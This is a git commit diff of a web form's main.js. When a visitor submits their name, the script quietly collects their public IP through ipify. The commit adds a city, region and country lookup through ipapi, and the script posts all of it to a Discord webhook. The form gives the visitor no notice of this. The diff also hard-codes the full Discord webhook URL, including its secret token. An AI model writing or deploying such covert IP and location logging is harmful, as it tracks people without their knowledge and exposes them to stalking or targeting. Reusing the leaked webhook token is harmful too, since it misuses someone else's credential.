19498a8ad42ecf2f6b050675b2370276430deb4c
dansomegastash <168002231+dansomegastash@users.noreply.github.com>
2024-04-30 09:04:50 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,30 +1,24 @@
-// main.js
 
 document.getElementById("myForm").addEventListener("submit", async function(event) {
-  event.preventDefault(); // Prevent default form submission
-
+  event.preventDefault();
   var name = document.getElementById("name").value;
-
   if(name.toLowerCase() === "danisgod") {
     console.log("You invoked the power of Dan!");
     alert("You invoked the power of Dan!");
     document.getElementById("outputBox").innerText = "You invoked the power of Dan!";
-    document.getElementById("name").value = ""; // Clear the input field
-    return; // Exit the function early
+    document.getElementById("name").value = "";
+    return;
   }
-
   try {
-    // Get user's IP address using api.ipify.org
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    const userIp = data.ip;
-
-    // Construct the message payload for Discord
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+    const userIp = ipData.ip;
+    const geoResponse = await fetch(`https://ipapi.com/api/${userIp}?api_key=YOUR_API_KEY`);
+    const geoData = await geoResponse.json();
+    const { city, region, country_name } = geoData;
     const discordPayload = {
-      content: `New submission:\nName: ${name}\nUser IP: ${userIp}`
+      content: `New submission:\nName: ${name}\nUser IP: ${userIp}\nLocation: ${city}, ${region}, ${country_name}`
     };
-
-    // Send data to Discord webhook
     const webhookUrl = 'https://discord.com/api/webhooks/1232847300125130763/Q0Fe1iehHKm6L1XnzH5urs5I_ajPNpOcasLr1F4-qspBgQ3hBOOVG_6wMrL4-htRYqJe';
     const discordResponse = await fetch(webhookUrl, {
       method: "POST",
@@ -37,8 +31,6 @@ document.getElementById("myForm").addEventListener("submit", async function(even
     if (!discordResponse.ok) {
       throw new Error('Failed to send data to Discord');
     }
-
-    // Reset form fields and show success message
     alert("Data submitted successfully");
     document.getElementById("myForm").reset();
   } catch (error) {
